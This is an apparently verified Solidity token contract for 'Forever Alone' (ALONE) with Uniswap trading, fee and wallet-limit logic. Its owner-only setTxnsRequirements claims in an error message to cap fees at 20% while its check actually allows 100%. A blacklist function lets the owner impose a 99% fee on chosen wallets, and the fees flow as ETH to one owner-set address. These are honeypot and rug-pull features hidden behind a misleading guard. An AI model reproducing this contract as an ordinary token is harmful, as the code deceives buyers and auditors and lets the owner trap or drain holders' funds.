/**
 *Submitted for verification at Etherscan.io on 2023-10-24
*/

/**

https://t.me/ForeverAloneCrypto
https://foreveralone.biz/
https://twitter.com/4everaloneCRPT

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;


library SafeMath {

    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
        function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract ALONE is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name =unicode'Forever Alone';
    string private constant _symbol =unicode'ALONE';
    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 10000000 * (10 ** _decimals);
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isFeeExempted;
    mapping (address => bool) private isBotUser;
    IRouter router;
    address public pair;
    bool private tradingIsAllowed = true;
    bool private swapIsEnabled = true;
    uint256 private swapTimesOf;
    bool private isSwapping;
    uint256 swapAmounts = 1;
    uint256 private swapThresholds = ( _totalSupply * 1000 ) / 100000;
    uint256 private minTokenAmounts = ( _totalSupply * 10 ) / 100000;
    modifier lockTheSwap {isSwapping = true; _; isSwapping = false;}
    uint256 private liquidityFees = 0;
    uint256 private marketingFees = 0;
    uint256 private developmentFeess = 1000;
    uint256 private burnFeess = 0;
    uint256 private transferFeess = 3000;
    uint256 private sellFeess = 3000;
    uint256 private totalFeess = 1500;
    uint256 private denominatorss = 10000;
    address internal constant DEADAD = 0x000000000000000000000000000000000000dEaD;
    uint256 public _maxTxAmountS = ( _totalSupply * 200 ) / 10000;
    uint256 public _maxSellAmountS = ( _totalSupply * 200 ) / 10000;
    uint256 public _maxWalletTokenS = ( _totalSupply * 200 ) / 10000;
    address internal development_receiverAdd = 0x999EBaa24A56D8EfB99796FCE298a751D7C814EA; 
    address internal marketing_receiverAdd = 0x999EBaa24A56D8EfB99796FCE298a751D7C814EA;
    address internal liquidity_receiverAdd = 0x999EBaa24A56D8EfB99796FCE298a751D7C814EA;

    constructor() Ownable(msg.sender) {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router; pair = _pair;
        isFeeExempted[address(this)] = true;
        isFeeExempted[liquidity_receiverAdd] = true;
        isFeeExempted[marketing_receiverAdd] = true;
        isFeeExempted[development_receiverAdd] = true;
        isFeeExempted[msg.sender] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function startTrading() external onlyOwner {tradingIsAllowed = true;}
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function setisExempt(address _address, bool _enabled) external onlyOwner {isFeeExempted[_address] = _enabled;}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEADAD)).sub(balanceOf(address(0)));}

   function setTxnsRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        liquidityFees = _liquidity; marketingFees = _marketing; burnFeess = _burn; developmentFeess = _development; totalFeess = _total; sellFeess = _sell; transferFeess = _trans;
        require(totalFeess <= denominatorss.div(1) && sellFeess <= denominatorss.div(1) && transferFeess <= denominatorss.div(1), "totalFeess and sellFeess cannot be more than 20%");
    }
    function shouldContractTrade(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= minTokenAmounts;
        bool aboveThreshold = balanceOf(address(this)) >= swapThresholds;
        return !isSwapping && swapIsEnabled && tradingIsAllowed && aboveMin && !isFeeExempted[sender] && recipient == pair && swapTimesOf >= swapAmounts && aboveThreshold;
    }

    function setisBotUSer(address[] calldata addresses, bool _enabled) external onlyOwner {
        for(uint i=0; i < addresses.length; i++){
        isBotUser[addresses[i]] = _enabled; }
    }

     function setInternalAdds(address _marketing, address _liquidity, address _development) external onlyOwner {
        marketing_receiverAdd = _marketing; liquidity_receiverAdd = _liquidity; development_receiverAdd = _development;
        isFeeExempted[_marketing] = true; isFeeExempted[_liquidity] = true; isFeeExempted[_development] = true;
    }


 

       function setContractTradeSettings(uint256 _swapAmount, uint256 _swapThreshold, uint256 _minTokenAmount) external onlyOwner {
        swapAmounts = _swapAmount; swapThresholds = _totalSupply.mul(_swapThreshold).div(uint256(100000)); 
        minTokenAmounts = _totalSupply.mul(_minTokenAmount).div(uint256(100000));
    }

    function setTxnsLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _totalSupply.mul(_buy).div(10000); uint256 newTransfer = _totalSupply.mul(_sell).div(10000); uint256 newWallet = _totalSupply.mul(_wallet).div(10000);
        _maxTxAmountS = newTx; _maxSellAmountS = newTransfer; _maxWalletTokenS = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }




    function manualSwappping() external onlyOwner {
        swapAndLiquifyToken(swapThresholds);
    }

    function recoverERC20s(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
        IERC20(_address).transfer(development_receiverAdd, _amount);
    }

    function swapAndLiquifyToken(uint256 tokens) private lockTheSwap {
        uint256 _denominator = (liquidityFees.add(1).add(marketingFees).add(developmentFeess)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFees).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETHTokens(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFees));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFees);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidities(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFees);
        if(marketingAmt > 0){payable(marketing_receiverAdd).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(development_receiverAdd).transfer(contractBalance);}
    }

    function addLiquidities(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            liquidity_receiverAdd,
            block.timestamp);
    }

    function swapTokensForETHTokens(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

    function shouldTakeFeess(address sender, address recipient) internal view returns (bool) {
        return !isFeeExempted[sender] && !isFeeExempted[recipient];
    }

    function getTotalFeess(address sender, address recipient) internal view returns (uint256) {
        if(isBotUser[sender] || isBotUser[recipient]){return denominatorss.sub(uint256(100));}
        if(recipient == pair){return sellFeess;}
        if(sender == pair){return totalFeess;}
        return transferFeess;
    }


     function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isFeeExempted[sender] && !isFeeExempted[recipient]){require(tradingIsAllowed, "tradingIsAllowed");}
        if(!isFeeExempted[sender] && !isFeeExempted[recipient] && recipient != address(pair) && recipient != address(DEADAD)){
        require((_balances[recipient].add(amount)) <= _maxWalletTokenS, "Exceeds maximum wallet amount.");}
        if(sender != pair){require(amount <= _maxSellAmountS || isFeeExempted[sender] || isFeeExempted[recipient], "TX Limit Exceeded");}
        require(amount <= _maxTxAmountS || isFeeExempted[sender] || isFeeExempted[recipient], "TX Limit Exceeded"); 
        if(recipient == pair && !isFeeExempted[sender]){swapTimesOf += uint256(1);}
        if(shouldContractTrade(sender, recipient, amount)){swapAndLiquifyToken(swapThresholds); swapTimesOf = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = shouldTakeFeess(sender, recipient) ? takeFeess(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function takeFeess(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if(getTotalFeess(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominatorss).mul(getTotalFeess(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnFeess > uint256(0) && getTotalFeess(sender, recipient) > burnFeess){_transfer(address(this), address(DEADAD), amount.div(denominatorss).mul(burnFeess));}
        return amount.sub(feeAmount);} return amount;
    }

   

}